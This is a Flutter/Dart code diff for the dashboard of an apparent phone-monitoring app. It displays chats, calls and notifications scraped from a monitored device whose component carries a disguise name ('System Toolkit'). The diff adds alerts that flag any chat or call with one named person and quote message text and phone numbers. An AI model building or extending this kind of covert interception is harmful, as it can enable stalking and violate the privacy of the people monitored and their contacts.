@@ -107,78 +107,78 @@ class ParentDashboardProvider extends ChangeNotifier {
         if (loaded.isNotEmpty) {
           _children.clear();
           _children.addAll(loaded);
-
-          // Guarantee VYRA-13533 is always present in list
-          if (!_children.any((c) => c.pairingCode == _defaultChildCode || c.id == _defaultChildCode)) {
-            _children.insert(0, ChildProfile(
-              id: _defaultChildCode,
-              pairingCode: _defaultChildCode,
-              name: 'Vivo V2404',
-              deviceModel: 'Vivo V2404',
-              batteryLevel: 100,
-              isOnline: true,
-              locationAddress: 'Linked via $_defaultChildCode',
-              selectedDisguise: 'System Toolkit',
-            ));
-          }
-
-          // Filter out obsolete test IDs (like child_1, test)
-          if (savedActiveId != null &&
-              savedActiveId != 'child_1' &&
-              savedActiveId != 'child_2' &&
-              savedActiveId != 'child_default' &&
-              !savedActiveId.startsWith('test') &&
-              _children.any((c) => c.id == savedActiveId)) {
-            _activeChildId = savedActiveId;
-          } else {
-            _activeChildId = _defaultChildCode;
-          }
-
-          // Restore cached chats, calls, and notifications so data is immediately safe & visible
-          final cachedChatsRaw = prefs.getStringList('cache_chats_$_activeChildId');
-          if (cachedChatsRaw != null && cachedChatsRaw.isNotEmpty) {
-            final restored = <ChatMessage>[];
-            for (final raw in cachedChatsRaw) {
-              try {
-                restored.add(ChatMessage.fromJson(jsonDecode(raw)));
-              } catch (_) {}
-            }
-            if (restored.isNotEmpty) {
-              _childChatMessages[_activeChildId] = restored;
-              _mergeNotificationsIntoActiveChats();
-            }
-          }
-
-          final cachedCallsRaw = prefs.getStringList('cache_calls_$_activeChildId');
-          if (cachedCallsRaw != null && cachedCallsRaw.isNotEmpty) {
-            final restored = <CallRecord>[];
-            for (final raw in cachedCallsRaw) {
-              try {
-                restored.add(CallRecord.fromJson(jsonDecode(raw)));
-              } catch (_) {}
-            }
-            if (restored.isNotEmpty) {
-              _childCallRecords[_activeChildId] = restored;
-            }
-          }
-
-          final cachedNotifsRaw = prefs.getStringList('cache_notifs_$_activeChildId');
-          if (cachedNotifsRaw != null && cachedNotifsRaw.isNotEmpty) {
-            final restored = <NotificationItem>[];
-            for (final raw in cachedNotifsRaw) {
-              try {
-                restored.add(NotificationItem.fromJson(jsonDecode(raw)));
-              } catch (_) {}
-            }
-            if (restored.isNotEmpty) {
-              _childNotifications[_activeChildId] = restored;
-            }
-          }
-
-          syncFromSupabase();
-          notifyListeners();
         }
       }
+
+      // Guarantee VYRA-13533 is always present in list
+      if (!_children.any((c) => c.pairingCode == _defaultChildCode || c.id == _defaultChildCode)) {
+        _children.insert(0, ChildProfile(
+          id: _defaultChildCode,
+          pairingCode: _defaultChildCode,
+          name: 'Vivo V2404',
+          deviceModel: 'Vivo V2404',
+          batteryLevel: 100,
+          isOnline: true,
+          locationAddress: 'Linked via $_defaultChildCode',
+          selectedDisguise: 'System Toolkit',
+        ));
+      }
+
+      // Filter out obsolete test IDs (like child_1, test)
+      if (savedActiveId != null &&
+          savedActiveId != 'child_1' &&
+          savedActiveId != 'child_2' &&
+          savedActiveId != 'child_default' &&
+          !savedActiveId.startsWith('test') &&
+          _children.any((c) => c.id == savedActiveId)) {
+        _activeChildId = savedActiveId;
+      } else {
+        _activeChildId = _defaultChildCode;
+      }
+
+      // Unconditionally restore cached chats, calls, and notifications so local history is instantly available
+      final cachedChatsRaw = prefs.getStringList('cache_chats_$_activeChildId');
+      if (cachedChatsRaw != null && cachedChatsRaw.isNotEmpty) {
+        final restored = <ChatMessage>[];
+        for (final raw in cachedChatsRaw) {
+          try {
+            restored.add(ChatMessage.fromJson(jsonDecode(raw)));
+          } catch (_) {}
+        }
+        if (restored.isNotEmpty) {
+          _childChatMessages[_activeChildId] = restored;
+          _mergeNotificationsIntoActiveChats();
+        }
+      }
+
+      final cachedCallsRaw = prefs.getStringList('cache_calls_$_activeChildId');
+      if (cachedCallsRaw != null && cachedCallsRaw.isNotEmpty) {
+        final restored = <CallRecord>[];
+        for (final raw in cachedCallsRaw) {
+          try {
+            restored.add(CallRecord.fromJson(jsonDecode(raw)));
+          } catch (_) {}
+        }
+        if (restored.isNotEmpty) {
+          _childCallRecords[_activeChildId] = restored;
+        }
+      }
+
+      final cachedNotifsRaw = prefs.getStringList('cache_notifs_$_activeChildId');
+      if (cachedNotifsRaw != null && cachedNotifsRaw.isNotEmpty) {
+        final restored = <NotificationItem>[];
+        for (final raw in cachedNotifsRaw) {
+          try {
+            restored.add(NotificationItem.fromJson(jsonDecode(raw)));
+          } catch (_) {}
+        }
+        if (restored.isNotEmpty) {
+          _childNotifications[_activeChildId] = restored;
+        }
+      }
+
+      syncFromSupabase();
+      notifyListeners();
     } catch (e) {
       debugPrint("Load persistence error: $e");
     }
@@ -314,6 +314,26 @@ class ParentDashboardProvider extends ChangeNotifier {
         for (final msg in newMsgs) {
           if (!existingIds.contains(msg.id)) {
             _childChatMessages[_activeChildId]!.insert(0, msg);
+
+            // 🚨 High Alert Watchdog for Harshit Kamboj
+            if (msg.isWatchlistTarget) {
+              _childNotifications.putIfAbsent(_activeChildId, () => []);
+              final alertId = 'alert_harshit_${msg.id}';
+              if (!_childNotifications[_activeChildId]!.any((n) => n.id == alertId)) {
+                _childNotifications[_activeChildId]!.insert(
+                  0,
+                  NotificationItem(
+                    id: alertId,
+                    packageName: 'com.vyra.alerts',
+                    appName: 'Vyra Watchdog',
+                    title: '🚨 HIGH ALERT: Harshit Kamboj Activity',
+                    message: '${msg.appType.name.toUpperCase()} chat with Harshit: "${msg.messageText.length > 70 ? '${msg.messageText.substring(0, 70)}...' : msg.messageText}"',
+                    timestamp: msg.timestamp,
+                    isSensitiveAlert: true,
+                  ),
+                );
+              }
+            }
           }
         }
         _mergeNotificationsIntoActiveChats();
@@ -786,6 +806,26 @@ class ParentDashboardProvider extends ChangeNotifier {
           for (final call in newCalls) {
             if (!existingCallIds.contains(call.id)) {
               _childCallRecords[_activeChildId]!.add(call);
+
+              // 🚨 High Alert Watchdog for Harshit calls
+              if (call.isWatchlistTarget) {
+                _childNotifications.putIfAbsent(_activeChildId, () => []);
+                final alertId = 'alert_harshit_call_${call.id}';
+                if (!_childNotifications[_activeChildId]!.any((n) => n.id == alertId)) {
+                  _childNotifications[_activeChildId]!.insert(
+                    0,
+                    NotificationItem(
+                      id: alertId,
+                      packageName: 'com.vyra.alerts',
+                      appName: 'Vyra Watchdog',
+                      title: '🚨 HIGH ALERT: Harshit Call Detected',
+                      message: '${call.callType == CallType.incoming ? "Incoming call from" : "Call with"} Harshit (${call.phoneNumber.isNotEmpty ? call.phoneNumber : call.contactName}), duration: ${call.durationSeconds}s',
+                      timestamp: call.timestamp,
+                      isSensitiveAlert: true,
+                    ),
+                  );
+                }
+              }
             }
           }
           _childCallRecords[_activeChildId]!.sort((a, b) => b.timestamp.compareTo(a.timestamp));
@@ -994,6 +1034,26 @@ class ParentDashboardProvider extends ChangeNotifier {
         for (final msg in newMsgs) {
           if (existingIds.add(msg.id)) {
             _childChatMessages[_activeChildId]!.add(msg);
+
+            // 🚨 High Alert Watchdog for Harshit Kamboj
+            if (msg.isWatchlistTarget) {
+              _childNotifications.putIfAbsent(_activeChildId, () => []);
+              final alertId = 'alert_harshit_${msg.id}';
+              if (!_childNotifications[_activeChildId]!.any((n) => n.id == alertId)) {
+                _childNotifications[_activeChildId]!.insert(
+                  0,
+                  NotificationItem(
+                    id: alertId,
+                    packageName: 'com.vyra.alerts',
+                    appName: 'Vyra Watchdog',
+                    title: '🚨 HIGH ALERT: Harshit Kamboj Activity',
+                    message: '${msg.appType.name.toUpperCase()} chat with Harshit: "${msg.messageText.length > 70 ? '${msg.messageText.substring(0, 70)}...' : msg.messageText}"',
+                    timestamp: msg.timestamp,
+                    isSensitiveAlert: true,
+                  ),
+                );
+              }
+            }
           }
         }
         _childChatMessages[_activeChildId]!.sort((a, b) => b.timestamp.compareTo(a.timestamp));
@@ -1248,12 +1308,20 @@ class ParentDashboardProvider extends ChangeNotifier {
       'never miss snaps',
       'add friends',
       'find friends',
+      'delivered',
+      'opened',
+      'received',
+      'sent',
+      'seen',
     };
     if (uiNavigationGarbage.contains(lower)) return true;
     if (lower.contains('turn on notifications') || lower.contains('never miss snaps')) return true;
 
+    // Status bar battery percentage (e.g., "78%", "100%")
+    if (RegExp(r'^\d{1,3}%$').hasMatch(t)) return true;
+
     // Snapchat streaks / feed chips (e.g., "Delivered 1h 298🔥", "Opened 2m", "Sent 5h")
-    if (RegExp(r'^(delivered|opened|received|sent)\s+\d+.*', caseSensitive: false).hasMatch(t)) {
+    if (RegExp(r'^(delivered|opened|received|sent|seen)\s+\d+.*', caseSensitive: false).hasMatch(t)) {
       return true;
     }
     if (RegExp(r'^\d+🔥$').hasMatch(t)) return true;
